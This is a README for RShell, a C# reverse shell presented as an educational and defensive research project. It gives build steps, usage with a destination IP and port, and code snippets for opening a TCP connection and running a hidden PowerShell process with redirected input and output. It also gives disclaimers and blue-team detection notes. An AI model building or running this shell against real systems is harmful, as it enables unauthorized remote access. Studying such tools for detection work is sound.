# RShell (C# ‚Äî Educational Reverse Shell)

RShell is a minimal reverse shell written in **C#**.  
It exists **strictly for educational and defensive research**‚Äîto study .NET networking, process I/O redirection, and blue-team detection strategies in a controlled lab.

## ‚öñÔ∏è Legal & Ethical Use

**Authorized use only.** This project is provided to:
- Learn how reverse shells function at a code level.
- Run controlled, consented, and documented tests in your **own** lab.
- Improve defensive detections and incident response.

**You must not** use this software to access systems without explicit written permission.  

By using, copying, or modifying this code, **you agree** that:
- You have legal authorization to run any tests you perform.
- You accept full responsibility for outcomes and compliance with all applicable laws and policies.
- The authors and contributors are **not liable** for misuse, damage, or legal consequences.

## üõ†Ô∏è Build Instructions

### Option A ‚Äî Visual Studio
1. Create a new **Console App** (C#).
2. Replace the default `Program.cs` with the one in this repository.
3. Build in **Release** mode.

### Option B ‚Äî .NET SDK (CLI)
If you prefer SDK-style:

```bash
dotnet new console -n RShell
# Copy your Program.cs over the generated one
dotnet build -c Release RShell
```

### Option C ‚Äî CSC (C# compiler)
If the .NET compiler is available on PATH:

```bash
csc src\\Program.cs -out:RShell.exe
```

If you change the PowerShell path or add cross-platform support, document those changes in this README.

## ‚ñ∂Ô∏è Runtime Parameters
The program expects two arguments:

```bash
RShell.exe <ip> <port>
```

- `<ip>` : Destination IP (string)
- `<port>` : Destination port (integer)

‚ö†Ô∏è Note: This is for lab use only in environments you own/control and are authorized to test.
Do not point this at networks or hosts without written consent.

## üîç Code Walkthrough
Key elements in Program.cs:

### Networking:

```csharp
TcpClient client = new TcpClient();
client.Connect(ip, port);
```

### Streams:
Wraps the network stream with StreamReader/StreamWriter for line-oriented I/O.

### Process:
Launches PowerShell via ProcessStartInfo with:

```csharp
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardError = true;
p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
```

### Event Handlers:
Subscribes to OutputDataReceived / ErrorDataReceived to forward output lines back over the socket.

### Loop:
Reads remote lines and writes them to:

```csharp
p.StandardInput.WriteLine(userInput);
```

## üß™ Safe Lab & Testing Guidance (High-Level)
To keep this ethical and safe:

- Isolate your lab. Use local VMs or containers on a closed network with no internet egress.
- Document consent. If collaborating, get written permission (scope, dates, systems, data handling).
- Least privilege. Use non-admin test accounts and non-production systems/data.
- Observe & learn. Pair runs with monitoring (process creation logs, PowerShell logging, network telemetry).
- No operationalization. This README does not include listener setup or exploitation steps.

## üõ°Ô∏è Blue-Team Notes (Defensive Study)
When running in a lab, explore how the following controls observe activity:

- PowerShell Logging: Script Block, Module, and Transcription logging
- AMSI (Antimalware Scan Interface): Scans PowerShell content before execution
- Process Creation Events: Windows Event ID 4688 / Sysmon Event ID 1
- Network Telemetry: Egress connections, unusual destinations/ports
- Command-line Auditing: Visibility into -ExecutionPolicy Bypass usage

Questions to ask in your lab:

- Which alerts fire?
- What telemetry is missing?
- How could defenders detect similar behavior earlier?

## ‚öôÔ∏è Configuration Ideas (for Learning)
If you extend the project (in your lab), consider adding:

- Configurable PowerShell path for different Windows versions
- Timeouts/Retries for connections
- Graceful Exit signals to close the child process cleanly
- Optional local logging (lab only) for troubleshooting
- Authentication/TLS (lab only) to explore secure communication

‚ö†Ô∏è Do not add evasion features or anti-forensic behavior. Such contributions will be rejected.

## üö´ Known Limitations
- Windows-only (hardcoded PowerShell path)
- No encryption/authentication on the TCP channel
- Minimal error handling
- No reconnection logic or persistence (by design)
- Requires interactive remote input (no job control)

## ‚ùì FAQ
**Q: Why omit listener/exploitation instructions?**  
A: To avoid misuse. This project is for understanding code paths and defensive visibility, not for exploitation.

**Q: Can I change -ExecutionPolicy Bypass?**  
A: Yes ‚Äî this is just for lab use. Try stricter settings and study logs.

**Q: Will you accept PRs adding stealth/evasion?**  
A: No. Only educational or defensive improvements are accepted.

## ü§ù Contributing
Keep changes educational and defense-oriented.

Do not submit features meant to bypass security controls.

Include documentation and rationales in PRs.

## üîê Disclosure & Safety Policy
If you discover a security issue in this repository:

- Do not post it publicly.
- Open a private report (via GitHub Security Advisory, if available).
- Or contact the maintainer by email.

For real-world vulnerabilities elsewhere, follow responsible disclosure with the affected vendor.
